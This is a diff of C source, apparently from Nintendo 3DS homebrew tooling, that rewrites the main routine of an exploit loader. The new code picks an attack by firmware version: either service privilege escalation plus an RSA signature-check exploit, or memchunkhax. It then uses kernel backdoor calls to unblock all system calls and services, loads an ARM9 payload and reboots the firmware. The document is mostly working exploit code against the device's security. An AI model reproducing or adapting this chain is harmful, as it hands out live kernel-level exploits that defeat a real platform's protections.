@@ -1,8 +1,11 @@
 #include <string.h>
 #include "gspgpu.h"
 #include "text.h"
-#include "memchunkhax.h"
-#include "brahma.h"
+
+#include "exploits/rsa_exploit.h"
+#include "exploits/memchunkhax.h"
+#include "exploits/brahma.h"
+
 #include "libctru/types.h"
 #include "libctru/svc.h"
 #include "libctru/srv.h"
@@ -135,8 +138,12 @@ s32 set_test_result(void)
 extern u8 *g_ext_arm9_buf;
 extern u64 g_ext_arm9_size;
 
+Result escalateServicePrivileges(Handle *wantedServiceHandle, const char *wantedServiceName);
+
 int main(u32 loaderparam, char** argv)
 {
+	Handle srvHandle;
+	
 	u32 *paramblk = (u32*)loaderparam;
 	Handle* gspHandle=(Handle*)paramblk[0x58>>2];
 	u32* linear_buffer = (u32*)((((u32)paramblk) + 0x1000) & ~0xfff);
@@ -144,56 +151,67 @@ int main(u32 loaderparam, char** argv)
 	// put framebuffers in linear mem so they're writable
 	u8* top_framebuffer = &linear_buffer[0x00100000/4];
 	u8* low_framebuffer = &top_framebuffer[0x00046500];
-
-	srvInit();
 	
 	GSP_SetBufferSwap(*gspHandle, 0, (GSPGPU_FramebufferInfo){0, (u32*)top_framebuffer, (u32*)top_framebuffer, 240 * 3, (1<<8)|(1<<6)|1, 0, 0});
 	GSP_SetBufferSwap(*gspHandle, 1, (GSPGPU_FramebufferInfo){0, (u32*)low_framebuffer, (u32*)low_framebuffer, 240 * 3, 1, 0, 0});
 	
 	drawTitleScreen("");
 	
-	Handle aptuHandle;
-	Handle aptLockHandle;
-	bool isN3ds;
-	aptSessionInit();
+	u32 fversion = (*(vu32*)0x1FF80000) & ~0xFF;
+	if(fversion < 0x2210400)
+	{
+		Handle psHandle;
+		renderString("Escalating privileges", 8, 50);
+		Result ret = escalateServicePrivileges(&psHandle, "ps:ps");
+		drawHex(ret, 8, 60);
+		drawHex(psHandle, 8, 90);
 	
-	aptOpenSession();
-	APT_GetLockHandle(&aptuHandle, 0x0, &aptLockHandle);
-	aptCloseSession();
+		renderString("Triggering PS_VerifyRsaSha256_Exploit", 8, 70);
+		ret = PS_VerifyRsaSha256_Exploit(&psHandle, linear_buffer);
+		drawHex(ret, 8, 80);
+	}
+	else
+	{
+		renderString("SrvInit()", 8, 50);
+		srvInit(&srvHandle, NULL);
+		Handle aptuHandle;
+		Handle aptLockHandle;
+		bool isN3ds;
+		aptSessionInit();
 	
-	aptOpenSession();
-	APT_CheckNew3ds(&aptuHandle, &isN3ds);
-	aptCloseSession();
+		aptOpenSession();
+		APT_GetLockHandle(&aptuHandle, 0x0, &aptLockHandle);
+		aptCloseSession();
 	
-	svcCloseHandle(aptLockHandle);
+		aptOpenSession();
+		APT_CheckNew3ds(&aptuHandle, &isN3ds);
+		aptCloseSession();
 	
-	drawTitleScreen("");
-	drawHex(isN3ds, 8, 120);
+		svcCloseHandle(aptLockHandle);
+		renderString("Trying memchunkhax", 8, 50);
+		do_memchunkhax1();
 	
-	renderString("Trying memchunkhax", 8, 50);
-	do_memchunkhax1();
+		svc_7b((backdoor_fn)k_enable_all_svcs, isN3ds);
+		renderString("Unblocked svcs    ", 8, 50);
+		svcSleepThread(1e+9);
 	
-	svc_7b((backdoor_fn)k_enable_all_svcs, isN3ds);
-	renderString("Unblocked svcs    ", 8, 50);
-	svcSleepThread(1e+9);
+		test_result ="FAILED !!!";
+		svcBackdoor(set_test_result);
+		renderString(test_result, 8, 60);
 	
-	test_result ="FAILED !!!";
-	svcBackdoor(set_test_result);
-	renderString(test_result, 8, 60);
+		renderString("Unblocking access to all services", 8, 70);
+		unlock_services(isN3ds, &srvHandle);
 	
-	renderString("Unblocking access to all services", 8, 70);
-	unlock_services(isN3ds);
+		renderString("Initing brahma", 8, 80);
+		Result ret = brahma_init();
+		drawHex(ret, 8, 90);
 	
-	renderString("Initing brahma", 8, 80);
-	Result ret = brahma_init();
-	drawHex(ret, 8, 90);
-	
-	ret = load_arm9_payload_offset ("/arm9.bin", 0, 0);
-	drawHex(ret, 8, 100);
+		ret = load_arm9_payload_offset ("/arm9.bin", 0, 0);
+		drawHex(ret, 8, 100);
 
-	ret = firm_reboot(isN3ds);
-	drawHex((u32)ret, 8, 110);
-	
+		ret = firm_reboot(isN3ds);
+		drawHex((u32)ret, 8, 110);
+	}
 	svcSleepThread(100000000); //sleep long enough for memory to be written
 	//drawTitleScreen("\n   The homemenu ropbin is ready.");
 	while(1);
